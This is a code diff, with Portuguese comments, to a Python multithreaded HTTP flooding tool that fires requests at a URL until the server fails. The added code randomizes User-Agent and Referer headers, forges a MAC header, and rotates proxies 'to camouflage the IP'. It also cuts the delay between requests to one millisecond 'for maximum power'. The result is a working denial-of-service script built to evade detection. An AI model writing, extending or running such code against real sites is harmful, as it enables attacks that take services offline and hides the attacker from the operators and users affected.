@@ -6,6 +6,7 @@ import sys
 from urllib.parse import urlparse
 import signal
 from datetime import datetime
+import random
 
 # Configurações globais
 REQUEST_COUNT = 0  # Contador de requisições
@@ -37,26 +38,65 @@ def validate_url(url):
         print(f"\033[91m[ERRO] URL {url} inválida ou servidor offline: {e}\033[0m")
         return None
 
-def send_requests(url, max_requests_per_thread, method="GET", post_data=None):
+def get_random_user_agent():
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/89.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 Chrome/56.0.2924.87",
+        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 Chrome/83.0.4103.106 Mobile",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 Chrome/78.0.3904.97",
+        "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 Chrome/74.0.3729.157 Mobile"
+    ]
+    return random.choice(user_agents)
+
+def get_random_referer():
+    referers = [
+        "https://www.google.com/",
+        "https://www.bing.com/",
+        "https://www.facebook.com/",
+        "https://www.youtube.com/",
+        "https://www.instagram.com/",
+        "https://twitter.com/",
+        "https://www.reddit.com/",
+        "https://www.linkedin.com/"
+    ]
+    return random.choice(referers)
+
+def get_random_mac():
+    mac = [random.randint(0x00, 0x7f) for _ in range(6)]
+    return ':'.join(f'{x:02x}' for x in mac)
+
+def send_requests(url, max_requests_per_thread, method="GET", post_data=None, proxies_list=None, verify_ssl=False):
     """Envia requisições HTTP até o limite, parada manual ou servidor cair."""
     global REQUEST_COUNT, SUCCESS_COUNT, ERROR_COUNT, SERVER_DOWN
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124"
-    }
     count = 0
 
     while not STOP_EVENT.is_set() and count < max_requests_per_thread and not SERVER_DOWN:
         try:
+            headers = {
+                "User-Agent": get_random_user_agent(),
+                "Accept": "*/*",
+                "Connection": "keep-alive",
+                "Referer": get_random_referer(),
+                "X-Forwarded-MAC": get_random_mac()
+            }
+            # Escolhe proxy aleatório se lista fornecida
+            proxies = None
+            if proxies_list and len(proxies_list) > 0:
+                proxies = random.choice(proxies_list)
             start_time = time.time()
             if method == "POST":
-                response = requests.post(url, headers=headers, data=post_data, timeout=10)
+                response = requests.post(url, headers=headers, data=post_data, timeout=10, proxies=proxies, verify=verify_ssl)
             else:
-                response = requests.get(url, headers=headers, timeout=10)
+                response = requests.get(url, headers=headers, timeout=10, proxies=proxies, verify=verify_ssl)
             elapsed = time.time() - start_time
             with LOCK:
                 REQUEST_COUNT += 1
                 SUCCESS_COUNT += 1
-                msg = f"Status {response.status_code} | Tempo: {elapsed:.2f}s | Método: {method}"
+                msg = f"Status {response.status_code} | Tempo: {elapsed:.2f}s | Método: {method} | UA: {headers['User-Agent']} | MAC: {headers['X-Forwarded-MAC']} | Referer: {headers['Referer']}"
                 logging.info(msg)
                 print(f"\033[92m[{threading.current_thread().name}] {msg}\033[0m")
             if response.status_code >= 500:
@@ -77,7 +117,7 @@ def send_requests(url, max_requests_per_thread, method="GET", post_data=None):
                     msg = f"Servidor caiu: {e}. Parando teste."
                     logging.warning(msg)
                     print(f"\033[91m[{threading.current_thread().name}] {msg}\033[0m")
-        time.sleep(0.1)  # Delay pra evitar sobrecarga
+        time.sleep(0.001)  # Delay mínimo para máxima potência
         count += 1
 
 def signal_handler(sig, frame):
@@ -116,7 +156,9 @@ def main():
         "num_threads": 5,
         "max_requests": 100,
         "method": "GET",
-        "post_data": None
+        "post_data": None,
+        "proxies_list": [],
+        "verify_ssl": False
     }
 
     while True:
@@ -135,6 +177,27 @@ def main():
             except ValueError:
                 print("\033[91m[ERRO] Insira números válidos.\033[0m")
                 continue
+
+            proxies_list = []
+            use_proxy = input("Deseja usar proxies para camuflar o IP? (s/n): ").strip().lower()
+            if use_proxy == "s":
+                print("\033[93mInsira os proxies (um por linha, formato tipo://ip:porta). Digite vazio para terminar:\033[0m")
+                while True:
+                    proxy_input = input().strip()
+                    if not proxy_input:
+                        break
+                    if proxy_input.startswith("http"):
+                        proxies_list.append({"http": proxy_input, "https": proxy_input})
+                    elif proxy_input.startswith("socks5"):
+                        proxies_list.append({"http": proxy_input, "https": proxy_input})
+                    else:
+                        print("\033[91mProxy inválido, use http://ip:porta ou socks5://ip:porta\033[0m")
+                config["proxies_list"] = proxies_list
+            else:
+                config["proxies_list"] = []
+
+            verify_ssl = input("Ignorar verificação SSL? (s/n): ").strip().lower()
+            config["verify_ssl"] = (verify_ssl == "n")
 
             config["url"] = url
             config["num_threads"] = num_threads
@@ -162,7 +225,7 @@ def main():
             for i in range(num_threads):
                 thread = threading.Thread(
                     target=send_requests,
-                    args=(url, max_requests, config["method"], config["post_data"]),
+                    args=(url, max_requests, config["method"], config["post_data"], config["proxies_list"], config["verify_ssl"]),
                     name=f"Thread-{i+1}"
                 )
                 threads.append(thread)
